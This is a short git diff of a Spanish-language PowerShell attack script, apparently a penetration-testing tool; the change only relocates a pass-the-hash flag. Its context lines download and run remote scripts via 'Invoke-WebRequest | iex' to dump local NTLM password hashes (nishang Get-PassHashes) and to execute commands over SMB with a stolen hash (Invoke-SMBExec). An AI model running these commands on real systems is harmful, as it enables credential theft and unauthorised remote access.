@@ -66,7 +66,6 @@ function ConvertFrom-SecureToPlain {
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
         if($hash -like 's*') { 
-        $PassTheHash = "true"
         Write-Host "Recuperando hashes locales.." -ForegroundColor Magenta
         Write-Host ""
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1" -UseBasicParsing | iex
@@ -77,6 +76,7 @@ function ConvertFrom-SecureToPlain {
         $user = Read-Host -Prompt 'Y el usuario?'
         Write-Host ""
         $password = Read-Host -Prompt 'Introduce el hash NTLM'
+	$PassTheHash = "true"
         Write-Host ""
         $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" -UseBasicParsing | iex
